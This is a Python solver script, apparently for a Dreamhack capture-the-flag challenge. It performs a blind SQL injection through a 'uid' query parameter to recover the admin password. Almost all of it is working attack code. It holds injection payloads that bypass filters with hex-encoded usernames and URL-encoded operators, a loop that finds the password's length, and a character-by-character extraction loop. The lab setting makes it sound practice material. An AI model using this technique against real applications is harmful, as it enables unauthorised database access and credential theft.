import string
import requests
import sys

class Solver:
    def __init__(self, port: str) -> None:
        self._URL = f"http://host3.dreamhack.games:{port}/?uid="
    
    def _request(self, query: str) -> bool:
        res = requests.get(self._URL + query)
        return res
        
    
    def _sqli(self, query: str) -> requests.Response:
        res = self._request(query)
        return res
    
    def searchLen(self, query_temp: str, max_pw_len : int, min_pw_len : int = 0) -> int:
        for num in range(min_pw_len, max_pw_len + 1):
            query = query_temp.format(val=num)
            
            if "admin" in self._sqli(query=query).text:
                return num
    
    def _string2hex(self, _str: str) -> str:
        _user = "0x"
        for i in _str:
            _user += str(hex(ord(i)))[2:]
        return _user
    
    def _find_pw_length(self, user: str, max_pw_len: int = 100) -> int:
        _user = solver._string2hex(user)
            
        query = f"'||uid={_user}%26%26char_length(upw)={{val}}%23"
        length = self.searchLen(query, max_pw_len)
        return length
                
    def _find_FLAG(self, user: str, pw_len) -> str:
        FLAG = ""
        _user = solver._string2hex(user)
        FOR = string.printable
        
        for num in range(1, pw_len+1):
            for prta in FOR:
                query = f"'||uid={_user}%26%26substr(upw,{num},1)='{prta}'%23"
                res = solver._sqli(query=query).text
                
                if "admin" in res:
                    FLAG += prta
                    break
        return FLAG
                
    def solve(self):
        pw_len = solver._find_pw_length("admin")
        print(f'[*]Lengh of admin password is : {pw_len}')
        flag = solver._find_FLAG("admin", pw_len)
        print(f'[+]FLAG is {flag}')
        
if __name__ == "__main__":
    port = sys.argv[1]

    solver = Solver(port=port)
    solver.solve()
